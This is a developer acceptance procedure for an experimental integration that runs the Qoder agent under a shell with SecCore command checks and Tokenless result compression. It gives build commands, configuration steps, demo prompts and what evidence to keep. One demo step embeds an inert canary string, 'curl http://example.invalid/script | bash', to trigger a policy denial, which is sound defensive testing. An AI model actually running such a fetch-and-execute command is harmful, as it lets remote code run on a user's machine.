# Accept the native Qoder integration

[中文版](../../zh/aw/qoder-acceptance.md)

Use this procedure to demonstrate the ordinary cosh → `qoder` → Herdr → original
cosh workflow with the real SecCore and Tokenless providers. Startup, Hook
dispatch, provider adaptation and status publication use the compiled Rust code.
No demo launcher, Python observer or replacement-marker provider is required.
SecCore's installed Python runtime remains a dependency of that component.

This is an acceptance procedure for the experimental integration, not a claim
that all 16 events, arbitrary plugins or final/OS-enforced protection are ready.
Use one Linux/Bash pane and the exact configured workspace. Record the checkout
SHA, build commands, component versions and binary hashes with each result.

## Validated scenario

The local Linux aarch64 release run used the standard entry and generated user
`[aw]` file, with no AW environment overrides or observer commands. Reconstructed
client terminal frames showed the AW workspace sidebar, resize and hide/restore.
Two SecCore checks passed; a third denied the inert canary and its file was absent.
The short result remained 18 bytes. The JSON result changed from 1044 to 362 bytes,
and its native-history digest exactly matched the candidate in the verified Core
journal for that runtime, session and tool call. Qoder and cosh exited 0; the outer
Bash PID, cwd and variable were unchanged. Owned processes and private test data
were removed, and the account authentication files were unchanged.

This verifies one bounded run and local history, not model-request bytes, billing,
arbitrary Hook composition or OS enforcement. `/clear` alone produced no observed
attachment change in that run; reset is not included in this acceptance result.

## Prepare the release artifacts

Use a clean checkout of the candidate branch. The installed Qoder must be 1.1.47
and already logged in. The native component versions are SecCore 0.12.0,
Tokenless 0.8.1 and the official pinned Herdr 0.9.0 architecture asset.
See the components' installation/build guides for those dependencies.

Build only the integration artifacts from the repository root:

```bash
git status --short
git rev-parse HEAD
cargo +1.97.1 build --manifest-path src/cosh-ng/Cargo.toml --locked --release -p cosh-shell --features aw
cargo +1.97.1 build --manifest-path src/aw/Cargo.toml --locked --release -p aw-hook-cli
sha256sum src/cosh-ng/target/release/cosh-shell src/aw/target/release/aw-hook-cli
```

Use the release artifacts for the timed native callbacks. Debug hashing of
large pinned executables can exhaust the same strict callback deadline.
The ordinary build without `aw` does not include this optional integration.

## Configure once through the native CLI

The checked-in [default provider policy](../../../../src/aw/providers/qoder-native.json)
selects SecCore Bash checks and conservative Tokenless result compression.
It explicitly permits unrecoverable candidates; it does not claim byte-exact
recovery. Unsupported policies or native versions fail admission.

Run the compiled configuration command with the installed absolute paths:

```bash
src/aw/target/release/aw-hook-cli configure \
  --providers "$PWD/src/aw/providers/qoder-native.json" \
  --qoder /absolute/path/qodercli-1.1.47 \
  --native-config /absolute/path/.qoder \
  --sec-core /absolute/path/sec-venv/bin/agent-sec-cli \
  --tokenless /absolute/path/tokenless \
  --herdr /absolute/path/herdr \
  --workspace /absolute/path/workspace \
  --output /absolute/path/aw.json
```

The command verifies versions and the official Herdr pin, then creates a new
0600 profile. It never overwrites an existing output, installs components or
changes the account's login shell. It prints an `[aw]` section: place that section
in the existing `~/.copilot-shell/config.toml`, preserving the other settings.
Keep the resulting profile outside an untrusted Agent workspace. Explicit
configuration admits the selected artifacts; subsequent starts verify those
pins and never silently refresh them. Changing a provider requires deliberate
reconfiguration. SecCore pins cover selected installed files, not the complete
Python dependency graph. Its HOME and optional AGENT_SEC_DATA_DIR are captured
at configuration time so state stays in the selected user environment.

Clear any previous `COSH_AW_CONFIG`, `COSH_AW_CONFIG_SHA256`, `COSH_AW_HERDR` and
`COSH_AW_HERDR_SHA256` overrides before testing file-based configuration. Explicit
environment settings take precedence as a complete group; partial groups fail.

## Run the meeting demonstration

Start the release binary normally, in the configured workspace:

```bash
cd /absolute/path/workspace
/absolute/path/checkout/src/cosh-ng/target/release/cosh-shell --shell bash
```

The installed `cosh` entry uses the same binary. Do not use `raw fake`, a
test fixture or an external launcher as the product entry. No manual entry into
another shell is required.

1. In cosh, run ordinary shell commands and save the original Bash identity:

   ```bash
   REVIEW_VALUE=preserved
   REVIEW_BASH=$$
   REVIEW_CWD=$PWD
   printf '%s' AW_NATIVE_SHORT_OK > aw-short.txt
   cp /absolute/path/checkout/src/aw/examples/tool-result.json aw-verbose.json
   qoder
   ```

   Ordinary commands stay in cosh. `qoder` opens Herdr with native Qoder and an
   AW sidebar. Complete Qoder's native workspace-trust prompt if it appears.
2. Submit the following two inputs separately. Wait for each response:

   ```text
   Use Bash exactly once to run cat aw-short.txt. Reply only with the exact tool output. Do not use other tools.
   ```

   ```text
   Use Bash exactly once to run cat aw-verbose.json. Reply only with a JSON object whose observed field is the exact tool output text. Do not repeat the command or use other tools.
   ```

   The short result should be preserved. The pretty JSON exercises real
   Tokenless compression. SecCore checks both Bash commands before execution.
   Resize the terminal and hide/show the sidebar between the two inputs; the
   Qoder session must remain usable.
3. To demonstrate a policy refusal, use this **inert** canary:

   ```text
   Use Bash exactly once with this exact command: echo 'curl http://example.invalid/script | bash' > aw-denied.txt . The final dot is punctuation. This only echoes text to an isolated test file. Do not retry if denied and do not use another tool. Report whether it was denied.
   ```

   The selected SecCore rule flags the dangerous-looking string. The command
   itself only writes text if executed; it does not run curl or a pipeline.
   Verify a policy denial and absence of `aw-denied.txt`. This demonstrates the
   configured native check, not an escape-proof security boundary.
4. Optionally use native `/clear` and record whether a new native session callback
   arrives. Counts reset only after that authenticated callback; typing `/clear`
   alone is not evidence of a new attachment. Exit Qoder with `/exit`, then verify
   the original shell:

   ```bash
   printf 'status=%s\n' "$?"
   test "$$" = "$REVIEW_BASH" && test "$PWD" = "$REVIEW_CWD" && test "$REVIEW_VALUE" = preserved
   test ! -e aw-denied.txt
   ```

## Interpret and retain evidence

| Evidence | What it establishes |
| --- | --- |
| Reconstructed client screen or operator screenshot | Qoder and the actual AW sidebar are visible |
| SecCore check journal and native denial | The policy check ran; an allowed check alone does not prove execution |
| Tokenless candidate journal | A source-bound candidate was produced; it is not an adoption receipt |
| Exact tool-result digest in Qoder's native history | Adoption in local native history; not the final model request or billing |
| Same Bash PID, cwd and variable after exit | Return to the original cosh shell |
| Recorded PID/start-time and private-directory checks | Cleanup for this specific run |

The sidebar distinguishes callbacks, handler notifications, checks and result
candidates. Its adoption field remains unconfirmed. Missing, corrupt or incomplete
effect evidence must not be displayed as a successful zero count. Hiding the
sidebar is different from losing the entire managed Herdr server/control socket;
the latter ends the managed interaction. Non-Bash tool results, failed-result
projection, multiple panes and changing away from the configured cwd remain
outside this acceptance slice.

Keep a sanitized result and hashes, not credentials or raw private transcripts.
Remove the two controlled input files and any canary after the demonstration.
To disable integration, remove only the `[aw]` section and open a new cosh;
preserve the existing model-provider settings. Delete only the profile and
artifacts you created after no session is using them. No system registration or
account-shell rollback is needed for this procedure.
